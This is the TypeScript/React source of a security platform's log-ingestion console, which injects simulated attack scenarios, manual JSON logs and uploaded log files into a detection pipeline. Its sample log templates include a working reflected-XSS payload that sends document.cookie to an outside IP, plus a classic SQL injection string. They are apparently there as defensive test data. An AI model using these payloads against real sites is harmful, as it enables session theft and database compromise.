/**
 * 接入台 · 值班主线第一站（2026-11 AI Web 改造）
 *
 * 对齐登录页「01 接入」叙事：日志进平台的门。
 *   - 攻击剧本库：一键注入真实感攻击序列（拓扑/时序可核验，移植 generate_test_feed v5）
 *   - 手动录入：单条 JSON 编辑器 + 模板选择
 *   - 文件上传：.json / .jsonl 批量导入
 * 注入统一走 /api/logs/scenario|manual(批量) 管道 —— Kafka 优先/HTTP 直写、
 * admission 门禁、审计盖章，与外部数据源完全同权；每条日志带 inject_source
 * 标记（明示演练/手动来源，不伪装真实流量）。
 */
import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { motion } from 'framer-motion'
import { PageFrame, tabOn, tabOff } from '../components/common/PageFrame'
import { api } from '../lib/api'

type TabKey = 'scenarios' | 'manual' | 'upload'

interface ScenarioCard {
  name: string
  title: string
  description: string
  count: number
  severity_summary: Record<string, number>
}

interface InjectResult {
  ok: boolean
  title: string
  detail: string
  count?: number
  sessionId?: string
  queued?: boolean
}

const SEVERITY_ORDER = ['critical', 'high', 'medium', 'low', 'info'] as const
const SEVERITY_LABEL: Record<string, string> = {
  critical: 'critical',
  high: 'high',
  medium: 'medium',
  low: 'low',
  info: 'info',
}

/** 手动录入模板（与 log_scenarios 拓扑同源，可直接改字段后提交） */
const TEMPLATES: Record<string, Record<string, unknown>> = {
  'SSH 暴力破解（单条确认）': {
    event: '暴力破解', severity: 'critical', src_ip: '185.220.101.45', dst_ip: '192.168.1.10',
    dst_port: 22, protocol: 'SSH',
    message: 'Brute force pattern confirmed: 24 consecutive SSH auth failures then successful login from 185.220.101.45',
  },
  'C2 信标': {
    event: 'C2 通信', severity: 'critical', src_ip: '192.168.1.24', dst_ip: '45.61.136.187',
    dst_port: 443, protocol: 'TCP', threat_type: 'C2_BEACON',
    message: 'C2 beacon traffic captured: 60s interval, JA3 fingerprint matches Cobalt Strike',
  },
  'SQL 注入': {
    event: 'SQL注入', severity: 'high', src_ip: '198.51.100.77', dst_ip: '192.168.1.20',
    dst_port: 80, protocol: 'HTTP', method: 'GET', status: 500,
    url: "/products?id=1' OR '1'='1",
    message: "SQL injection attempt in query param: /products?id=1' OR '1'='1, WAF blocked with 500",
  },
  'XSS 攻击': {
    event: 'XSS攻击', severity: 'high', src_ip: '198.51.100.77', dst_ip: '192.168.1.20',
    dst_port: 80, protocol: 'HTTP', method: 'GET', status: 200,
    url: '/search?q=<script>document.location="http://45.61.136.187/?c="+document.cookie</script>',
    message: 'Reflected XSS in search parameter, session cookie exfiltration attempt',
  },
  '数据外泄（DNS 隧道）': {
    event: 'DNS 外泄', severity: 'critical', src_ip: '192.168.1.77', dst_ip: '185.199.108.153',
    dst_port: 53, protocol: 'DNS',
    message: 'DNS tunneling detected: d01xa1b2c3d4e5f6.tunnel.exfil-node.net (label len=56, entropy=4.2)',
  },
  '恶意软件检出': {
    event: '恶意软件', severity: 'high', src_ip: '192.168.1.87', dst_ip: '192.168.1.30',
    dst_port: 445, protocol: 'SMB',
    message: 'Malware detected: trojan.win32.agent executed on workstation, C2 callback to 194.26.29.156',
  },
  '端口扫描': {
    event: '端口扫描', severity: 'medium', src_ip: '198.51.100.77', dst_ip: '192.168.1.20',
    dst_port: 443, protocol: 'TCP',
    message: 'SYN scan on ports 22,80,443,3306 (nmap -sS, 2048 packets in 40s)',
  },
  '良性登录（对照组）': {
    event: '登录成功', severity: 'low', src_ip: '192.168.1.101', dst_ip: '192.168.1.10',
    dst_port: 22, protocol: 'SSH',
    message: 'Normal SSH login success for ops user from 192.168.1.101 (office hours)',
  },
}

function StatusLamp({ on, label, title }: { on: boolean | undefined; label: string; title: string }) {
  return (
    <span className="inline-flex items-center gap-1.5" title={title}>
      <span className={`h-1.5 w-1.5 rounded-full ${on ? 'bg-ok' : 'bg-ink-faint/50'}`} />
      <span className="font-mono text-[10px] uppercase tracking-[0.12em] text-ink-faint">{label}</span>
    </span>
  )
}

function SeverityChips({ summary }: { summary: Record<string, number> }) {
  const items = SEVERITY_ORDER.filter((s) => summary[s] > 0)
  if (!items.length) return null
  return (
    <div className="flex flex-wrap gap-1.5">
      {items.map((s) => (
        <span
          key={s}
          className={`rounded-[3px] px-1.5 py-0.5 font-mono text-[10px] ${
            s === 'critical' ? 'bg-alert/10 text-alert' : s === 'high' ? 'bg-warn/10 text-warn' : 'bg-mist text-ink-faint'
          }`}
        >
          {SEVERITY_LABEL[s]} ×{summary[s]}
        </span>
      ))}
    </div>
  )
}

export default function Ingest() {
  const navigate = useNavigate()
  const [tab, setTab] = useState<TabKey>('scenarios')
  const [scenarios, setScenarios] = useState<ScenarioCard[]>([])
  const [loadErr, setLoadErr] = useState('')
  const [busy, setBusy] = useState('') // 正在注入的剧本名 / 'manual' / 'upload'
  const [result, setResult] = useState<InjectResult | null>(null)

  // 手动录入
  const [template, setTemplate] = useState(Object.keys(TEMPLATES)[0])
  const [jsonText, setJsonText] = useState(JSON.stringify(TEMPLATES[Object.keys(TEMPLATES)[0]], null, 2))
  const [jsonErr, setJsonErr] = useState('')

  // 文件上传
  const fileRef = useRef<HTMLInputElement>(null)
  const [pendingLogs, setPendingLogs] = useState<Record<string, unknown>[]>([])
  const [fileName, setFileName] = useState('')
  const [parseErr, setParseErr] = useState('')

  // 管道状态灯
  const [kafka, setKafka] = useState<{ enabled: boolean; producer_active: boolean } | null>(null)
  const [healthOk, setHealthOk] = useState<boolean | undefined>(undefined)

  const refreshStatus = useCallback(() => {
    api.kafkaStatus().then((k) => setKafka({ enabled: k.enabled, producer_active: k.producer_active })).catch(() => setKafka(null))
    api.healthCheck().then(() => setHealthOk(true)).catch(() => setHealthOk(false))
  }, [])

  useEffect(() => {
    api.scenarios().then((r) => setScenarios(r.scenarios)).catch((e) => setLoadErr(e instanceof Error ? e.message : '剧本目录加载失败'))
    refreshStatus()
    const t = setInterval(refreshStatus, 15000)
    return () => clearInterval(t)
  }, [refreshStatus])

  const injectScenario = useCallback(async (name: string) => {
    setBusy(name)
    setResult(null)
    try {
      const r = await api.ingestScenario(name)
      setResult({
        ok: true, title: name,
        detail: r.status === 'queued' ? `已入队 Kafka（确认 ${r.produced}/${r.count}）` : `已写入管道 ${r.event_ids?.length ?? 0} 条`,
        count: r.event_ids?.length ?? r.count, sessionId: r.session_id, queued: r.status === 'queued',
      })
    } catch (e) {
      setResult({ ok: false, title: name, detail: e instanceof Error ? e.message : '注入失败' })
    } finally {
      setBusy('')
    }
  }, [])

  const applyTemplate = useCallback((name: string) => {
    setTemplate(name)
    setJsonText(JSON.stringify(TEMPLATES[name], null, 2))
    setJsonErr('')
  }, [])

  const injectManual = useCallback(async () => {
    let parsed: Record<string, unknown>
    try {
      parsed = JSON.parse(jsonText)
      if (typeof parsed !== 'object' || parsed === null || Array.isArray(parsed)) throw new Error('必须是 JSON 对象')
    } catch (e) {
      setJsonErr(e instanceof Error ? `JSON 无效：${e.message}` : 'JSON 无效')
      return
    }
    setJsonErr('')
    setBusy('manual')
    setResult(null)
    try {
      const r = await api.ingestManual(parsed)
      setResult({ ok: true, title: '手动录入', detail: `已写入，事件 #${r.event_ids?.[0] ?? '?'}`, sessionId: r.session_id, count: 1 })
    } catch (e) {
      setResult({ ok: false, title: '手动录入', detail: e instanceof Error ? e.message : '注入失败' })
    } finally {
      setBusy('')
    }
  }, [jsonText])

  const parseUpload = useCallback(async (file: File) => {
    setParseErr('')
    setPendingLogs([])
    setFileName(file.name)
    try {
      const text = await file.text()
      const trimmed = text.trim()
      let logs: unknown
      if (trimmed.startsWith('[')) {
        logs = JSON.parse(trimmed)
      } else {
        // JSONL：逐行解析（跳过空行）
        logs = trimmed.split('\n').filter((l) => l.trim()).map((l) => JSON.parse(l))
      }
      if (!Array.isArray(logs) || logs.length === 0) throw new Error('文件中未找到日志数组')
      if (logs.length > 500) throw new Error(`单次最多 500 条（当前 ${logs.length}），请拆分文件`)
      setPendingLogs(logs as Record<string, unknown>[])
    } catch (e) {
      setParseErr(e instanceof Error ? e.message : '文件解析失败')
    }
  }, [])

  const injectUpload = useCallback(async () => {
    if (!pendingLogs.length) return
    setBusy('upload')
    setResult(null)
    try {
      const r = await api.ingestManualBatch(pendingLogs)
      const partial = r.produced != null && r.count != null && r.produced < r.count
      setResult({
        ok: true, title: `文件上传 · ${fileName}`,
        detail: partial ? `部分入队（${r.produced}/${r.count}）—— 未确认的可重试` : `已写入 ${r.event_ids?.length ?? pendingLogs.length} 条`,
        count: r.event_ids?.length, sessionId: r.session_id,
      })
      setPendingLogs([])
      setFileName('')
    } catch (e) {
      setResult({ ok: false, title: `文件上传 · ${fileName}`, detail: e instanceof Error ? e.message : '注入失败' })
    } finally {
      setBusy('')
    }
  }, [fileName, pendingLogs])

  const totalScenarios = useMemo(() => scenarios.reduce((n, s) => n + s.count, 0), [scenarios])

  return (
    <PageFrame
      title="接入台"
      hint="01 接入 — 攻击剧本一键注入 · 手动录日志 · 文件批量上传 — 注入即走全量检测管道"
      extra={
        <div className="flex items-center gap-4">
          <StatusLamp on={healthOk} label="backend" title={healthOk ? '后端健康检查通过' : '后端不可达'} />
          <StatusLamp on={kafka?.enabled} label="kafka" title={kafka ? (kafka.enabled ? `总线启用 · ${kafka.producer_active ? '生产者在线' : '生产者离线（HTTP 直写兜底）'}` : '未启用 — HTTP 直写模式') : '状态未知'} />
          <StatusLamp on={kafka?.enabled ? kafka.producer_active : undefined} label="producer" title="Kafka 生产者是否在线" />
        </div>
      }
    >
      {/* 注入结果横幅 */}
      {result && (
        <motion.div
          initial={{ opacity: 0, y: -6 }}
          animate={{ opacity: 1, y: 0 }}
          className={`mb-4 flex flex-wrap items-center gap-x-4 gap-y-1 rounded-[4px] border px-4 py-2.5 text-[12.5px] ${
            result.ok ? 'border-ok/30 bg-ok/5 text-ink' : 'border-alert/30 bg-alert/5'
          }`}
        >
          <span className={`font-mono text-[10px] uppercase tracking-[0.14em] ${result.ok ? 'text-ok' : 'text-alert'}`}>
            {result.ok ? '已注入' : '失败'}
          </span>
          <span className="text-ink">{result.title}</span>
          <span className={result.ok ? 'text-ink-soft' : 'text-alert'}>{result.detail}</span>
          {result.sessionId && (
            <span className="font-mono text-[10.5px] text-ink-faint">session {result.sessionId.slice(0, 8)}…</span>
          )}
          {result.ok && (
            <button
              type="button"
              onClick={() => navigate('/logs')}
              className="ml-auto cursor-pointer text-[12px] text-accent underline underline-offset-2"
            >
              去日志中心看全链路 →
            </button>
          )}
        </motion.div>
      )}

      {/* Tab 行 */}
      <div className="flex items-baseline gap-6 border-b border-line pb-0">
        <button type="button" className={tab === 'scenarios' ? tabOn : tabOff} onClick={() => setTab('scenarios')}>
          攻击剧本库{scenarios.length > 0 && <span className="ml-1.5 font-mono text-[10px] text-ink-faint">{scenarios.length} 套 · {totalScenarios} 条</span>}
        </button>
        <button type="button" className={tab === 'manual' ? tabOn : tabOff} onClick={() => setTab('manual')}>
          手动录入
        </button>
        <button type="button" className={tab === 'upload' ? tabOn : tabOff} onClick={() => setTab('upload')}>
          文件上传
        </button>
      </div>

      <div className="pt-5">
        {tab === 'scenarios' && (
          <div className="space-y-4">
            {loadErr && (
              <p className="rounded-[4px] border border-alert/30 bg-alert/5 px-4 py-2.5 text-[12.5px] text-alert">{loadErr}</p>
            )}
            <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-3">
              {scenarios.map((s, i) => (
                <motion.div
                  key={s.name}
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: i * 0.03, duration: 0.25 }}
                  className="group flex flex-col rounded-[4px] border border-line bg-paper px-4 py-3.5 transition-colors hover:border-accent/40"
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="min-w-0">
                      <h3 className="text-[13.5px] font-medium text-ink">{s.title}</h3>
                      <p className="mt-1 text-[11.5px] leading-relaxed text-ink-soft">{s.description}</p>
                    </div>
                    <span className="shrink-0 rounded-[3px] bg-mist px-2 py-1 font-mono text-[10.5px] text-ink-soft">
                      {s.count} 条
                    </span>
                  </div>
                  <div className="mt-2.5">
                    <SeverityChips summary={s.severity_summary} />
                  </div>
                  <div className="mt-3 flex items-center justify-between gap-3 border-t border-line-soft pt-2.5">
                    <span className="font-mono text-[10px] uppercase tracking-[0.12em] text-ink-faint">
                      inject_source: scenario
                    </span>
                    <button
                      type="button"
                      onClick={() => injectScenario(s.name)}
                      disabled={busy !== ''}
                      className="cursor-pointer rounded-[3px] border border-accent bg-accent px-3.5 py-1.5 text-[12px] text-on-accent transition-colors hover:bg-accent-hover disabled:cursor-not-allowed disabled:opacity-50"
                    >
                      {busy === s.name ? '注入中…' : '一键注入'}
                    </button>
                  </div>
                </motion.div>
              ))}
            </div>
            <p className="text-[11.5px] leading-relaxed text-ink-faint">
              剧本数据移植自 v5 真实感修订版：src/dst 拓扑真实（内网失陷主机 → 外部 C2）、暴力破解同源连败+1 成功、
              良性对照组验证不误封。注入后事件将流经 检测 → 分诊 → LLM 审计 → 响应 全管道。
            </p>
          </div>
        )}

        {tab === 'manual' && (
          <div className="max-w-3xl space-y-3">
            <div className="flex flex-wrap items-center gap-3">
              <label className="font-mono text-[10px] uppercase tracking-[0.14em] text-ink-faint">模板</label>
              <select
                value={template}
                onChange={(e) => applyTemplate(e.target.value)}
                className="cursor-pointer rounded-[4px] border border-line-input bg-paper px-3 py-2 text-[12.5px] text-ink outline-none focus:border-accent"
              >
                {Object.keys(TEMPLATES).map((name) => (
                  <option key={name} value={name}>{name}</option>
                ))}
              </select>
            </div>
            <textarea
              value={jsonText}
              onChange={(e) => { setJsonText(e.target.value); setJsonErr('') }}
              rows={10}
              spellCheck={false}
              className="w-full resize-y rounded-[4px] border border-line-input bg-paper px-3.5 py-3 font-mono text-[12px] leading-relaxed text-ink outline-none focus:border-accent"
            />
            {jsonErr && <p className="text-[12px] text-alert">{jsonErr}</p>}
            <div className="flex items-center gap-3">
              <button
                type="button"
                onClick={injectManual}
                disabled={busy !== ''}
                className="cursor-pointer rounded-[4px] border border-accent bg-accent px-5 py-2 text-[12.5px] text-on-accent transition-colors hover:bg-accent-hover disabled:cursor-not-allowed disabled:opacity-50"
              >
                {busy === 'manual' ? '注入中…' : '注入这条日志'}
              </button>
              <span className="text-[11.5px] text-ink-faint">
                将带 inject_source: manual 标记（可审计到操作员）
              </span>
            </div>
          </div>
        )}

        {tab === 'upload' && (
          <div className="max-w-3xl space-y-3">
            <input
              ref={fileRef}
              type="file"
              accept=".json,.jsonl,.txt"
              className="hidden"
              onChange={(e) => {
                const f = e.target.files?.[0]
                if (f) parseUpload(f)
                e.target.value = ''
              }}
            />
            <button
              type="button"
              onClick={() => fileRef.current?.click()}
              className="flex w-full cursor-pointer flex-col items-center gap-2 rounded-[4px] border border-dashed border-line-input bg-paper px-6 py-10 transition-colors hover:border-accent/50"
            >
              <svg width="22" height="22" viewBox="0 0 20 20" fill="none" className="text-ink-faint">
                <path d="M10 13V3M10 3L6 7M10 3L14 7" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
                <path d="M3 13.5V16a1 1 0 001 1h12a1 1 0 001-1v-2.5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
              </svg>
              <span className="text-[13px] text-ink">选择 .json / .jsonl / .txt 文件（JSON 数组或逐行 JSON，≤500 条）</span>
              <span className="text-[11.5px] text-ink-faint">解析后预览确认，再一次性注入</span>
            </button>
            {parseErr && <p className="text-[12px] text-alert">{parseErr}</p>}
            {pendingLogs.length > 0 && (
              <div className="rounded-[4px] border border-line bg-paper px-4 py-3">
                <div className="flex flex-wrap items-center justify-between gap-3">
                  <p className="text-[12.5px] text-ink">
                    已解析 <span className="font-mono">{pendingLogs.length}</span> 条 — {fileName}
                  </p>
                  <div className="flex gap-2">
                    <button
                      type="button"
                      onClick={() => { setPendingLogs([]); setFileName('') }}
                      className="cursor-pointer rounded-[3px] border border-line px-3.5 py-1.5 text-[12px] text-ink-soft transition-colors hover:border-ink hover:text-ink"
                    >
                      清除
                    </button>
                    <button
                      type="button"
                      onClick={injectUpload}
                      disabled={busy !== ''}
                      className="cursor-pointer rounded-[3px] border border-accent bg-accent px-3.5 py-1.5 text-[12px] text-on-accent transition-colors hover:bg-accent-hover disabled:cursor-not-allowed disabled:opacity-50"
                    >
                      {busy === 'upload' ? '注入中…' : `注入 ${pendingLogs.length} 条`}
                    </button>
                  </div>
                </div>
                <pre className="mt-2.5 max-h-40 overflow-auto rounded-[3px] bg-mist/60 px-3 py-2 font-mono text-[11px] leading-relaxed text-ink-soft">
                  {JSON.stringify(pendingLogs.slice(0, 3), null, 2)}
                  {pendingLogs.length > 3 && `\n… 共 ${pendingLogs.length} 条`}
                </pre>
              </div>
            )}
          </div>
        )}
      </div>
    </PageFrame>
  )
}
